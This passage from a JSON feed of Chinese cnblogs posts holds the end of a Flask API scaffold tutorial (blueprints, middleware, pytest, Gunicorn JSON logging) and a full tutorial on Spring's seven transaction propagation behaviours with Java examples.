ResourceNotFound,\n    Success,\n)\n\n__all__ = [\n    \"JsonResponse\",\n    \"Success\",\n    \"Fail\",\n    \"ArgumentNotFound\",\n    \"ArgumentInvalid\",\n    \"AuthFailed\",\n    \"ResourceConflict\",\n    \"ResourceNotFound\",\n    \"ResourceForbidden\",\n]\n</code></pre>\n<h2 id=\"编写视图函数\">编写视图函数</h2>\n<p>代码文件 <code>apis/common/common.py</code>。以下定义了 5 个路由，主要用于测试响应类是否正常返回 JSON 格式。</p>\n<pre><code class=\"language-python\">from datetime import datetime\n\nfrom flask import Blueprint\n\nfrom handles import user as user_handle\nfrom pkgs.log import logger\nfrom responses import Success\n\nroute = Blueprint(\"common_apis\", __name__, url_prefix=\"/api\")\n\n\n@route.get(\"/health\")\ndef health_check():\n    # print(g.get(\"tracking_id\", \"no-tracking-id\"))\n    logger.info(\"Health check\")\n    return Success(data=\"OK\")\n\n\n@route.get(\"/users\")\ndef get_users():\n    users = user_handle.get_users()\n    return Success(data=users)\n\n\n@route.get(\"/names\")\ndef get_names():\n    names = [\"Alice\", \"Bob\", \"Charlie\"]\n    return Success(data=names)\n\n\n@route.get(\"/item\")\ndef get_item():\n    item = {\"id\": 101, \"name\": \"Sample Item\", \"price\": 29.99, \"now\": datetime.now()}\n    return Success(data=item)\n\n\n@route.get(\"/error\")\ndef get_error():\n    raise Exception(\"This is a test exception\")\n\n</code></pre>\n<p><code>GET /api/users</code> 调用了 <code>handles/</code> 中的代码，模拟查询数据库。<code>handles/user.py</code> 中的代码如下：</p>\n<pre><code class=\"language-python\">import time\nfrom typing import Any, Dict, List\n\n\ndef get_users() -&gt; List[Dict[str, Any]]:\n    # 模拟查询用户数据\n    time.sleep(0.1)  # 模拟延迟\n    users = [{\"id\": 1, \"name\": \"Alice\"}, {\"id\": 2, \"name\": \"Bob\"}]\n    return users\n</code></pre>\n<p>代码文件 <code>apis/common/__init__.py</code> 中导入各个蓝图并统一暴露。由于示例代码只定义了一个蓝图，所以这里写得很简单。如果有多个蓝图，可以把蓝图都添加到一个列表中，在 Flask 应用中一次性遍历注册。</p>\n<pre><code class=\"language-python\">from .common import route\n# from .common import route as common_route\n\n# routes = [\n#     common_route,\n# ]\n\n__all__ = [\"route\"]\n</code></pre>\n<p>代码文件 <code>apis/__init__.py</code> 中提供 Flask 应用的工厂函数。</p>\n<pre><code class=\"language-python\">import traceback\n\nfrom flask import Flask\n\nfrom apis.common import route as common_route\nfrom middlewares import tracking_id_middleware\nfrom responses import Fail, ResourceNotFound\nfrom pkgs.log import logger\n\n\n\n# 错误处理器\ndef error_handler_notfound(error):\n    return ResourceNotFound()\n\n\ndef error_handler_generic(error):\n    logger.error(traceback.format_exc())\n    return Fail(data=str(error))\n\n\n\ndef create_app() -&gt; Flask:\n    app = Flask(__name__)\n\n    # 注册中间件\n    app = tracking_id_middleware(app)\n\n    # 注册错误处理器\n    app.errorhandler(Exception)(error_handler_generic)\n    app.errorhandler(404)(error_handler_notfound)\n\n    # 注册蓝图\n    app.register_blueprint(common_route)\n\n    return app\n\n__all__ = [\n    \"create_app\",\n]\n</code></pre>\n<p>入口代码文件 <code>main.py</code></p>\n<pre><code class=\"language-python\">from apis import create_app\n\napp = create_app()\n\nif __name__ == \"__main__\":\n    app.run(host=\"127.0.0.1\", port=8000, debug=False)\n</code></pre>\n<h2 id=\"简单运行测试\">简单运行测试</h2>\n<ol>\n<li>启动应用</li>\n</ol>\n<pre><code class=\"language-bash\"># 方式1, 直接启动, 用于简单测试\npython main.py\n\n# 方式2, 使用 gunicorn, 这是生产环境启动方式. 配置文件默认路径即 ./gunicorn.conf.py\ngunicorn main:app\n</code></pre>\n<ol start=\"2\">\n<li>curl 请求 <code>/api/health</code>。可以看到响应头中已经有了 <code>X-Tracking-ID</code> 和 <code>X-DateTime</code></li>\n</ol>\n<pre><code class=\"language-bash\">$ curl -v http://127.0.0.1:8000/api/health\n*   Trying 127.0.0.1:8000...\n* Connected to 127.0.0.1 (127.0.0.1) port 8000\n* using HTTP/1.x\n&gt; GET /api/health HTTP/1.1\n&gt; Host: 127.0.0.1:8000\n&gt; User-Agent: curl/8.14.1\n&gt; Accept: */*\n&gt;\n* Request completely sent off\n&lt; HTTP/1.1 200 OK\n&lt; Server: gunicorn\n&lt; Date: Sat, 17 Jan 2026 08:41:07 GMT\n&lt; Connection: keep-alive\n&lt; Content-Type: application/json\n&lt; X-Tracking-ID: 1f0adb8d-9bee-49d4-873f-31aa1437da60\n&lt; X-DateTime: 2026-01-17T16:41:07+08:00\n&lt; Content-Length: 61\n&lt;\n* Connection #0 to host 127.0.0.1 left intact\n{\"code\": 200, \"msg\": \"GET /api/health success\", \"data\": \"OK\"}\n</code></pre>\n<ol start=\"3\">\n<li>curl 请求 <code>/api/users</code>。手动指定请求头中的 <code>X-Tracking-ID</code>，响应时也会保持相同的 ID。</li>\n</ol>\n<pre><code class=\"language-bash\">$ curl -v http://127.0.0.1:8000/api/users -H 'X-Tracking-ID:123456'\n*   Trying 127.0.0.1:8000...\n* Connected to 127.0.0.1 (127.0.0.1) port 8000\n* using HTTP/1.x\n&gt; GET /api/users HTTP/1.1\n&gt; Host: 127.0.0.1:8000\n&gt; User-Agent: curl/8.14.1\n&gt; Accept: */*\n&gt; X-Tracking-ID:123456\n&gt;\n* Request completely sent off\n&lt; HTTP/1.1 200 OK\n&lt; Server: gunicorn\n&lt; Date: Sat, 17 Jan 2026 08:44:37 GMT\n&lt; Connection: keep-alive\n&lt; Content-Type: application/json\n&lt; X-Tracking-ID: 123456\n&lt; X-DateTime: 2026-01-17T16:44:37+08:00\n&lt; Content-Length: 110\n&lt;\n* Connection #0 to host 127.0.0.1 left intact\n{\"code\": 200, \"msg\": \"GET /api/users success\", \"data\": [{\"id\": 1, \"name\": \"Alice\"}, {\"id\": 2, \"name\": \"Bob\"}]}\n</code></pre>\n<h2 id=\"编写单元测试\">编写单元测试</h2>\n<p>使用 pytest 进行单元测试，这里只是一个简单的示例</p>\n<h3 id=\"配置-pytest\">配置 pytest</h3>\n<p>配置文件 <code>pytest.ini</code></p>\n<pre><code class=\"language-ini\">[pytest]\ntestpaths = \"tests\"\npythonpath = \".\"\n</code></pre>\n<h3 id=\"测试代码\">测试代码</h3>\n<p>代码文件 <code>tests/apis/test_common.py</code></p>\n<pre><code class=\"language-python\">from typing import Generator\nfrom unittest.mock import MagicMock, patch\n\nimport pytest\nfrom flask import Flask\nfrom flask.testing import FlaskClient\n\nfrom apis.common import route as common_route\n\n\n@pytest.fixture\ndef app() -&gt; Generator[Flask, None, None]:\n    app = Flask(__name__)\n    app.config.update(\n        {\n            \"TESTING\": True,\n            \"DEBUG\": False,\n        }\n    )\n    app.register_blueprint(common_route)\n    yield app\n\n\n@pytest.fixture\ndef client(app: Flask) -&gt; FlaskClient:\n    return app.test_client()\n\n\nclass TestGetHealth:\n    def test_get_health_success(self, client: FlaskClient) -&gt; None:\n        resp = client.get(\"/api/health\")\n        assert resp.status_code == 200\n\n        resp_headers = resp.headers\n        assert resp_headers.get(\"Content-Type\") == \"application/json\"\n        assert \"X-Tracking-ID\" in resp_headers\n        assert \"X-DateTime\" in resp_headers\n\n        resp_body = resp.json\n        assert resp_body == {\n            \"code\": 200,\n            \"msg\": \"GET /api/health success\",\n            \"data\": \"OK\",\n        }\n\n\nclass TestGetUsers:\n    @patch(\"apis.common.common.user_handle.get_users\")\n    def test_get_users(self, mock_get_users: MagicMock, client: FlaskClient) -&gt; None:\n        # mock user.get_users() 的返回值\n        mock_get_users.return_value = [\n            {\"id\": 1, \"name\": \"Alice123\"},\n            {\"id\": 2, \"name\": \"Bob456\"},\n        ]\n\n        # 发送请求\n        resp = client.get(\"/api/users\")\n        assert resp.status_code == 200\n\n        resp_headers = resp.headers\n        assert resp_headers.get(\"Content-Type\") == \"application/json\"\n        assert \"X-Tracking-ID\" in resp_headers\n        assert \"X-DateTime\" in resp_headers\n\n        # resp_body = resp.json\n\n        mock_get_users.assert_called_once()\n\n</code></pre>\n<h3 id=\"执行测试\">执行测试</h3>\n<pre><code class=\"language-shell\">pytest -vv\n</code></pre>\n<h2 id=\"配置-gunicorn\">配置 Gunicorn</h2>\n<p>代码文件 <code>gunicorn.conf.py</code>。简单配置了一些启动参数，以及请求日志的格式。</p>\n<pre><code class=\"language-python\"># Gunicorn 配置文件\nfrom pathlib import Path\nfrom multiprocessing import cpu_count\nimport gunicorn.glogging\nfrom datetime import datetime\n\nclass CustomLogger(gunicorn.glogging.Logger):\n    def atoms(self, resp, req, environ, request_time):\n        \"\"\"\n        重写 atoms 方法来自定义日志占位符\n        \"\"\"\n        # 获取默认的所有占位符数据\n        atoms = super().atoms(resp, req, environ, request_time)\n        \n        # 自定义 't' (时间戳) 的格式\n        now = datetime.now().astimezone()\n        atoms['t'] = now.isoformat(timespec=\"seconds\")\n        \n        return atoms\n    \n\n# 预加载应用代码\npreload_app = True\n\n# 工作进程数量：通常是 CPU 核心数的 2 倍加 1\n# workers = int(cpu_count() * 2 + 1)\nworkers = 2\n\n# 使用 gevent 异步 worker 类型，适合 I/O 密集型应用\n# 注意：gevent worker 不使用 threads 参数，而是使用协程进行并发处理\nworker_class = \"gevent\"\n\n# 每个 gevent worker 可处理的最大并发连接数\nworker_connections = 2000\n\n# 绑定地址和端口\nbind = \"127.0.0.1:8000\"\n\n# 进程名称\nproc_name = \"flask-dev\"\n\n# PID 文件路径\npidfile = str(Path(__file__).parent / \"tmp\" / \"gunicorn.pid\")\n\nlogger_class = CustomLogger\naccess_log_format = (\n    '{\"@timestamp\": \"%(t)s\", '\n    '\"remote_addr\": \"%(h)s\", '\n    '\"protocol\": \"%(H)s\", '\n    '\"host\": \"%({host}i)s\", '\n    '\"request_method\": \"%(m)s\", '\n    '\"request_path\": \"%(U)s\", '\n    '\"status_code\": %(s)s, '\n    '\"response_length\": %(b)s, '\n    '\"referer\": \"%(f)s\", '\n    '\"user_agent\": \"%(a)s\", '\n    '\"x_tracking_id\": \"%({x-tracking-id}i)s\", '\n    '\"request_time\": %(L)s}'\n)\n\n# 访问日志路径\naccesslog = str(Path(__file__).parent / \"logs\" / \"access.log\")\n\n# 错误日志路径\nerrorlog = str(Path(__file__).parent / \"logs\" / \"error.log\")\n\n# 日志级别\nloglevel = \"debug\"\n</code></pre>\n<p>输出的日志格式。可以看到日志格式符合 JSON 规范，便于 Filebeat 收集后在 Kibana 上检索。</p>\n<pre><code class=\"language-shell\">$ tail -n 1 logs/access.log | python3 -m json.tool\n{\n    \"@timestamp\": \"2026-01-17T16:44:37+08:00\",\n    \"remote_addr\": \"127.0.0.1\",\n    \"protocol\": \"HTTP/1.1\",\n    \"host\": \"127.0.0.1:8000\",\n    \"request_method\": \"GET\",\n    \"request_path\": \"/api/users\",\n    \"status_code\": 200,\n    \"response_length\": 110,\n    \"referer\": \"-\",\n    \"user_agent\": \"curl/8.14.1\",\n    \"x_tracking_id\": \"123456\",\n    \"request_time\": 0.102042\n}\n</code></pre>\n<h2 id=\"补充\">补充</h2>\n<h3 id=\"全局对象-g-的注意事项\">全局对象 g 的注意事项</h3>\n<ol>\n<li><code>g</code> 不是进程或线程共享的全局变量，请只在请求处理流程中使用 <code>g</code>。</li>\n<li>如果视图函数中启动了后台线程或异步任务，在子线程中直接访问 <code>g</code> 通常会报错或获取不到数据。这时建议显式传递数据。</li>\n<li>不要在 <code>g</code> 中存储大文件或数据对象，否则会占用过高内存。</li>\n<li><code>g</code> 不是 <code>session</code>。</li>\n</ol>\n\n</div>\n<div id=\"MySignature\">\n    <p>本文来自博客园，作者：<a href=\"https://www.cnblogs.com/XY-Heruo/\" target=\"_blank\">花酒锄作田</a>，转载请注明原文链接：<a href=\"https://www.cnblogs.com/XY-Heruo/p/19496753\" target=\"_blank\">https://www.cnblogs.com/XY-Heruo/p/19496753</a></p>\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-01-17 17:22</span>&nbsp;\n<a href=\"https://www.cnblogs.com/XY-Heruo\">花酒锄作田</a>&nbsp;\n阅读(<span id=\"post_view_count\">14</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "一文吃透 Spring 事务传播行为：7 种场景+代码实战",
      "link": "https://www.cnblogs.com/sun-10387834/p/19493742",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/sun-10387834/p/19493742\" id=\"cb_post_title_url\" title=\"发布于 2026-01-17 14:22\">\n    <span>一文吃透 Spring 事务传播行为：7 种场景+代码实战</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                <div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<p>作为后端开发，Spring 事务是日常工作的基础，但不少人只会用 <code>@Transactional</code> 注解加个 <code>rollbackFor</code>，对底层的事务传播行为一知半解。直到遇到“嵌套调用事务不回滚”“重复提交导致数据异常”等问题，才发现对传播行为的理解不足会踩大坑。</p>\n<p>其实事务传播行为的核心很简单：当一个带有事务的方法，调用另一个方法时，如何决定新方法的事务边界（是复用当前事务，还是新建事务，或是不参与事务）。Spring 定义了 7 种标准传播行为，本文结合实际业务场景，逐一拆解每种行为的用法、代码示例和适用场景，帮你彻底吃透。</p>\n<p>先铺垫两个基础前提，避免理解偏差：</p>\n<ul>\n<li>\n<p>所有示例基于 Spring Boot 2.x+，依赖 <code>spring-boot-starter-data-jpa</code> 或 <code>mybatis-plus</code>（本文用 JPA 简化数据库操作）；</p>\n</li>\n<li>\n<p>事务传播行为仅对 <code>@Transactional</code> 注解修饰的方法生效，且必须通过 Spring 代理调用（同类方法内部调用需注意代理失效问题）。</p>\n</li>\n</ul>\n<h2 id=\"一spring-7-种事务传播行为全解析\">一、Spring 7 种事务传播行为全解析</h2>\n<p>Spring 事务传播行为通过 <code>propagation</code> 属性配置，默认值为 <code>REQUIRED</code>。下面按“日常使用率”排序，逐一讲解。</p>\n<h3 id=\"1-required默认如果有事务就复用没有就新建\">1. REQUIRED（默认）：如果有事务就复用，没有就新建</h3>\n<p><strong>核心逻辑</strong>：这是最常用的传播行为，遵循“能复用则复用，无则新建”的原则。如果调用方已经存在事务，被调用方就加入当前事务，两者共用一个事务边界（要么一起提交，要么一起回滚）；如果调用方没有事务，被调用方就新建一个独立事务。</p>\n<p><strong>业务场景</strong>：绝大多数核心业务流程，比如“创建订单+扣减库存”，两者必须在同一事务中，要么都成功，要么都失败。</p>\n<p><strong>代码示例</strong>：</p>\n<pre><code class=\"language-java\">@Service\npublic class OrderService {\n\n    @Autowired\n    private OrderRepository orderRepository;\n    @Autowired\n    private StockService stockService;\n\n    // 调用方：带有事务\n    @Transactional(rollbackFor = Exception.class)\n    public void createOrder(Long productId, Integer count, Long userId) {\n        // 1. 创建订单\n        Order order = new Order();\n        order.setProductId(productId);\n        order.setCount(count);\n        order.setUserId(userId);\n        order.setStatus(1); // 待支付\n        orderRepository.save(order);\n\n        // 2. 调用扣减库存方法（复用当前事务）\n        stockService.deductStock(productId, count);\n    }\n}\n\n@Service\npublic class StockService {\n\n    @Autowired\n    private StockRepository stockRepository;\n\n    // 被调用方：传播行为为 REQUIRED（默认，可省略）\n    @Transactional(propagation = Propagation.REQUIRED, rollbackFor = Exception.class)\n    public void deductStock(Long productId, Integer count) {\n        Stock stock = stockRepository.findByProductId(productId)\n                .orElseThrow(() -&gt; new RuntimeException(\"库存不存在\"));\n        \n        if (stock.getCount() &lt; count) {\n            throw new RuntimeException(\"库存不足\");\n        }\n\n        stock.setCount(stock.getCount() - count);\n        stockRepository.save(stock);\n    }\n}\n</code></pre>\n<p><strong>结果说明</strong>：</p>\n<ul>\n<li>\n<p>如果 <code>deductStock</code> 抛出异常（如库存不足），<code>createOrder</code> 的订单创建操作会一起回滚，不会出现“有订单无库存扣减”的脏数据；</p>\n</li>\n<li>\n<p>如果调用方 <code>createOrder</code> 没有加 <code>@Transactional</code>，<code>deductStock</code> 会新建独立事务，仅库存扣减操作受事务控制。</p>\n</li>\n</ul>\n<h3 id=\"2-supports如果有事务就复用没有就无事务\">2. SUPPORTS：如果有事务就复用，没有就无事务</h3>\n<p><strong>核心逻辑</strong>：被调用方“被动”参与事务，不主动创建事务。如果调用方有事务，就加入其中；如果调用方没有事务，就以无事务方式执行。</p>\n<p><strong>业务场景</strong>：查询类方法，既可以在事务中执行（保证查询到未提交的事务数据，如分布式事务中的一致性查询），也可以独立执行（普通查询场景）。</p>\n<p><strong>代码示例</strong>：</p>\n<pre><code class=\"language-java\">@Service\npublic class OrderQueryService {\n\n    @Autowired\n    private OrderRepository orderRepository;\n\n    // 传播行为为 SUPPORTS，不主动创建事务\n    @Transactional(propagation = Propagation.SUPPORTS, readOnly = true)\n    public Order getOrderById(Long orderId) {\n        return orderRepository.findById(orderId)\n                .orElseThrow(() -&gt; new RuntimeException(\"订单不存在\"));\n    }\n}\n\n// 调用场景1：调用方有事务\n@Service\npublic class OrderOperateService {\n    @Autowired\n    private OrderQueryService queryService;\n\n    @Transactional(rollbackFor = Exception.class)\n    public void updateOrderStatus(Long orderId, Integer status) {\n        // 复用当前事务查询订单（能查询到未提交的临时数据）\n        Order order = queryService.getOrderById(orderId);\n        order.setStatus(status);\n        orderRepository.save(order);\n    }\n}\n\n// 调用场景2：调用方无事务\n@Controller\npublic class OrderController {\n    @Autowired\n    private OrderQueryService queryService;\n\n    @GetMapping(\"/order/{id}\")\n    public ResponseEntity&lt;Order&gt; getOrder(@PathVariable Long id) {\n        // 无事务方式执行查询\n        return ResponseEntity.ok(queryService.getOrderById(id));\n    }\n}\n</code></pre>\n<p><strong>注意点</strong>：SUPPORTS 修饰的方法如果在无事务环境下执行，所有数据库操作都是自动提交的，无法回滚。</p>\n<h3 id=\"3-mandatory必须在已有事务中执行否则抛异常\">3. MANDATORY：必须在已有事务中执行，否则抛异常</h3>\n<p><strong>核心逻辑</strong>：被调用方强制要求调用方有事务，自身不新建事务。如果调用方没有事务，直接抛出 <code>IllegalTransactionStateException</code> 异常，拒绝执行。</p>\n<p><strong>业务场景</strong>：必须依赖调用方事务的操作，比如“订单状态变更日志记录”，必须和订单状态变更在同一事务中，确保日志与业务操作一致，不允许独立执行。</p>\n<p><strong>代码示例</strong>：</p>\n<pre><code class=\"language-java\">@Service\npublic class OrderLogService {\n\n    @Autowired\n    private OrderLogRepository logRepository;\n\n    // 必须在已有事务中执行，否则抛异常\n    @Transactional(propagation = Propagation.MANDATORY, rollbackFor = Exception.class)\n    public void recordLog(Long orderId, Integer oldStatus, Integer newStatus) {\n        OrderLog log = new OrderLog();\n        log.setOrderId(orderId);\n        log.setOldStatus(oldStatus);\n        log.setNewStatus(newStatus);\n        log.setOperateTime(LocalDateTime.now());\n        logRepository.save(log);\n    }\n}\n\n// 正确调用：调用方有事务\n@Service\npublic class OrderService {\n    @Autowired\n    private OrderLogService logService;\n\n    @Transactional(rollbackFor = Exception.class)\n    public void updateOrderStatus(Long orderId, Integer newStatus) {\n        Order order = orderRepository.findById(orderId).orElseThrow();\n        Integer oldStatus = order.getStatus();\n        order.setStatus(newStatus);\n        orderRepository.save(order);\n\n        // 正常执行，复用当前事务\n        logService.recordLog(orderId, oldStatus, newStatus);\n    }\n\n    // 错误调用：调用方无事务\n    public void errorUpdateStatus(Long orderId, Integer newStatus) {\n        // 调用 recordLog 时会抛 IllegalTransactionStateException\n        logService.recordLog(orderId, 1, newStatus);\n    }\n}\n</code></pre>\n<h3 id=\"4-requires_new无论是否有事务都新建独立事务\">4. REQUIRES_NEW：无论是否有事务，都新建独立事务</h3>\n<p><strong>核心逻辑</strong>：被调用方强制新建一个独立事务，与调用方事务完全隔离（两个事务互不影响，各自提交/回滚）。如果调用方已有事务，会先暂停当前事务，待新事务执行完成后，再恢复原事务。</p>\n<p><strong>业务场景</strong>：需要独立存在的操作，比如“订单创建失败后记录异常日志”，即使订单创建事务回滚，日志也必须保留，不能被回滚影响。</p>\n<p><strong>代码示例</strong>：</p>\n<pre><code class=\"language-java\">@Service\npublic class OrderErrorLogService {\n\n    @Autowired\n    private OrderErrorLogRepository errorLogRepository;\n\n    // 新建独立事务，与调用方事务隔离\n    @Transactional(propagation = Propagation.REQUIRES_NEW, rollbackFor = Exception.class)\n    public void recordErrorLog(Long productId, Integer count, String errorMsg) {\n        OrderErrorLog errorLog = new OrderErrorLog();\n        errorLog.setProductId(productId);\n        errorLog.setCount(count);\n        errorLog.setErrorMsg(errorMsg);\n        errorLog.setCreateTime(LocalDateTime.now());\n        errorLogRepository.save(errorLog);\n    }\n}\n\n@Service\npublic class OrderService {\n    @Autowired\n    private OrderErrorLogService errorLogService;\n\n    @Transactional(rollbackFor = Exception.class)\n    public void createOrder(Long productId, Integer count, Long userId) {\n        try {\n            // 模拟订单创建失败（如库存不足）\n            throw new RuntimeException(\"订单创建失败：库存不足\");\n        } catch (Exception e) {\n            // 记录错误日志，新建独立事务，即使当前事务回滚，日志也会保留\n            errorLogService.recordErrorLog(productId, count, e.getMessage());\n            // 重新抛出异常，让当前事务回滚\n            throw e;\n        }\n    }\n}\n</code></pre>\n<p><strong>结果说明</strong>：<code>createOrder</code> 事务回滚，但 <code>recordErrorLog</code> 新建的独立事务会正常提交，错误日志成功保存，实现“业务回滚但日志留存”的需求。</p>\n<h3 id=\"5-not_supported无论是否有事务都以无事务方式执行\">5. NOT_SUPPORTED：无论是否有事务，都以无事务方式执行</h3>\n<p><strong>核心逻辑</strong>：被调用方拒绝参与任何事务。如果调用方有事务，会先暂停当前事务，待被调用方无事务执行完成后，再恢复原事务；如果调用方无事务，直接正常执行。</p>\n<p><strong>业务场景</strong>：不需要事务的耗时操作，比如“订单创建后发送短信通知”，即使通知失败，也不能影响订单创建事务的提交；或者不允许在事务中执行的操作（如批量数据同步，避免长时间占用事务资源）。</p>\n<p><strong>代码示例</strong>：</p>\n<pre><code class=\"language-java\">@Service\npublic class SmsService {\n\n    // 拒绝参与事务，以无事务方式执行\n    @Transactional(propagation = Propagation.NOT_SUPPORTED)\n    public void sendOrderSms(Long userId, Long orderId) {\n        // 模拟短信发送（耗时操作，无事务）\n        try {\n            Thread.sleep(1000);\n            System.out.println(\"向用户\" + userId + \"发送订单\" + orderId + \"创建成功短信\");\n        } catch (InterruptedException e) {\n            Thread.currentThread().interrupt();\n            throw new RuntimeException(\"短信发送失败\");\n        }\n    }\n}\n\n@Service\npublic class OrderService {\n    @Autowired\n    private SmsService smsService;\n\n    @Transactional(rollbackFor = Exception.class)\n    public void createOrder(Long productId, Integer count, Long userId) {\n        // 1. 创建订单（事务内操作）\n        Order order = new Order();\n        // ... 订单赋值逻辑\n        orderRepository.save(order);\n\n        // 2. 发送短信（无事务，即使失败也不影响订单提交）\n        try {\n            smsService.sendOrderSms(userId, order.getId());\n        } catch (Exception e) {\n            // 仅记录异常，不回滚订单事务\n            System.err.println(\"短信发送失败：\" + e.getMessage());\n        }\n    }\n}\n</code></pre>\n<h3 id=\"6-never必须在无事务环境下执行否则抛异常\">6. NEVER：必须在无事务环境下执行，否则抛异常</h3>\n<p><strong>核心逻辑</strong>：被调用方严格禁止在事务中执行。如果调用方有事务，直接抛出 <code>IllegalTransactionStateException</code> 异常；如果调用方无事务，正常执行。</p>\n<p><strong>业务场景</strong>：完全不允许事务控制的操作，比如“数据归档脚本”“第三方接口调用（自身已保证幂等）”，避免事务长时间占用资源或导致数据一致性问题。</p>\n<p><strong>代码示例</strong>：</p>\n<pre><code class=\"language-java\">@Service\npublic class DataArchiveService {\n\n    // 必须无事务执行，有事务则抛异常\n    @Transactional(propagation = Propagation.NEVER)\n    public void archiveOldOrder(LocalDateTime endTime) {\n        // 模拟归档3个月前的订单数据（无事务，避免长时间锁表）\n        List&lt;Order&gt; oldOrders = orderRepository.findByCreateTimeBefore(endTime);\n        // ... 归档逻辑\n    }\n}\n\n// 错误调用：调用方有事务\n@Service\npublic class OrderService {\n    @Autowired\n    private DataArchiveService archiveService;\n\n    @Transactional(rollbackFor = Exception.class)\n    public void doArchive() {\n        // 调用 archiveOldOrder 时会抛异常，因为当前有事务\n        archiveService.archiveOldOrder(LocalDateTime.now().minusMonths(3));\n    }\n}\n</code></pre>\n<h3 id=\"7-nested嵌套事务依赖调用方事务\">7. NESTED：嵌套事务，依赖调用方事务</h3>\n<p><strong>核心逻辑</strong>：被调用方在调用方事务内创建一个“嵌套子事务”，子事务依赖于父事务（调用方事务）。父事务提交时，子事务才会提交；父事务回滚时，子事务必然回滚；但子事务回滚时，父事务可以选择继续执行（不会被子事务回滚影响）。</p>\n<p><strong>注意</strong>：嵌套事务依赖数据库支持（如 MySQL 的 SAVEPOINT 保存点机制），并非所有数据库都支持；与 REQUIRES_NEW 的区别是：NESTED 是子事务，与父事务同属一个事务上下文；REQUIRES_NEW 是完全独立的事务。</p>\n<p><strong>业务场景</strong>：父事务中包含可选操作，子事务失败不影响父事务核心逻辑，比如“创建订单时尝试扣减优惠券”，优惠券扣减失败（子事务回滚），但订单创建（父事务）可以继续执行。</p>\n<p><strong>代码示例</strong>：</p>\n<pre><code class=\"language-java\">@Service\npublic class CouponService {\n\n    @Autowired\n    private CouponRepository couponRepository;\n\n    // 嵌套事务，依赖调用方事务\n    @Transactional(propagation = Propagation.NESTED, rollbackFor = Exception.class)\n    public void deductCoupon(Long couponId, Long userId) {\n        Coupon coupon = couponRepository.findByIdAndUserId(couponId, userId)\n                .orElseThrow(() -&gt; new RuntimeException(\"优惠券不存在\"));\n\n        if (coupon.getIsUsed()) {\n            throw new RuntimeException(\"优惠券已使用\");\n        }\n\n        coupon.setIsUsed(true);\n        couponRepository.save(coupon);\n    }\n}\n\n@Service\npublic class OrderService {\n    @Autowired\n    private CouponService couponService;\n\n    @Transactional(rollbackFor = Exception.class)\n    public void createOrder(Long productId, Integer count, Long userId, Long couponId) {\n        // 1. 创建订单（父事务核心逻辑）\n        Order order = new Order();\n        // ... 订单赋值逻辑\n        orderRepository.save(order);\n\n        // 2. 尝试扣减优惠券（子事务，失败不影响订单）\n        try {\n            couponService.deductCoupon(couponId, userId);\n        } catch (Exception e) {\n            // 子事务回滚，父事务继续执行\n            System.err.println(\"优惠券扣减失败：\" + e.getMessage());\n        }\n    }\n}\n</code></pre>\n<p><strong>结果说明</strong>：如果优惠券扣减失败（子事务回滚），订单创建操作（父事务）依然会正常提交；如果订单创建失败（父事务回滚），优惠券扣减操作（子事务）也会跟着回滚。</p>\n<h2 id=\"二常见误区与实战建议\">二、常见误区与实战建议</h2>\n<h3 id=\"1-同类方法内部调用传播行为失效\">1. 同类方法内部调用，传播行为失效</h3>\n<p>Spring 事务基于动态代理实现，同类方法内部调用时，不会经过代理，导致 <code>@Transactional</code> 注解失效，传播行为自然不生效。</p>\n<pre><code class=\"language-java\">@Service\npublic class OrderService {\n    // 错误示例：内部调用，传播行为失效\n    @Transactional(rollbackFor = Exception.class)\n    public void createOrder() {\n        // 内部调用 deductStock，@Transactional 注解失效\n        this.deductStock();\n    }\n\n    @Transactional(propagation = Propagation.REQUIRES_NEW)\n    public void deductStock() {\n        // ... 库存扣减逻辑\n    }\n}\n</code></pre>\n<p><strong>解决方案</strong>：通过 Spring 上下文获取自身代理对象调用，或拆分方法到不同 Service 类。</p>\n<h3 id=\"2-传播行为与隔离级别区分开\">2. 传播行为与隔离级别区分开</h3>\n<p>不少人会混淆“传播行为”和“隔离级别”：传播行为控制的是“事务之间的调用关系”，隔离级别控制的是“事务内部对数据的可见性”（如脏读、不可重复读），两者互不影响，可独立配置。</p>\n<h3 id=\"3-优先使用默认传播行为按需选型\">3. 优先使用默认传播行为，按需选型</h3>\n<p>日常开发中，REQUIRED（默认）能覆盖 80% 以上场景；需要独立事务用 REQUIRES_NEW；查询方法用 SUPPORTS；严格依赖/禁止事务用 MANDATORY/NEVER；嵌套事务谨慎使用（依赖数据库支持）。</p>\n<h2 id=\"三总结\">三、总结</h2>\n<p>Spring 事务传播行为的本质是“事务边界的控制规则”，核心是解决“多方法调用时事务如何协同”的问题。掌握每种行为的适用场景，结合实际业务选择，才能避免事务漏洞（如数据不一致、事务失效、资源浪费）。</p>\n<p>建议实际开发中，先明确“方法间事务是否需要协同”，再选择对应的传播行为，同时搭配 <code>rollbackFor</code>（指定回滚异常类型）、<code>readOnly</code>（查询优化）等属性，让事务控制更精准、高效。</p>\n\n</div>\n<div id=\"MySignature\">\n    \n<p>❤️ 如果你喜欢这篇文章，请点赞支持！ 👍 同时欢迎关注我的博客，获取更多精彩内容！</p>\n\n<p>本文来自博客园，作者：<a href=\"https://www.cnblogs.com/sun-10387834/\" target=\"_blank\">佛祖让我来巡山</a>，转载请注明原文链接：<a href=\"https://www.cnblogs.com/sun-10387834/p/19493742\" target=\"_blank\">https://www.cnblogs.com/sun-10387834/p/19493742</a></p>\n\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-01-17 14:22</span>&nbsp;\n<a href=\"https://www.cnblogs.com/sun-10387834\">佛祖让我来巡山</a>&nbsp;\n阅读(<span id=\"post_view_count\">0</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "【Azure APIM】如何解决后端API服务配置自签名证书时APIM请求报错500：Error occured while calling backend service",
      "link": "https://www.cnblogs.com/lulight/p/19495544",
      "published": "",
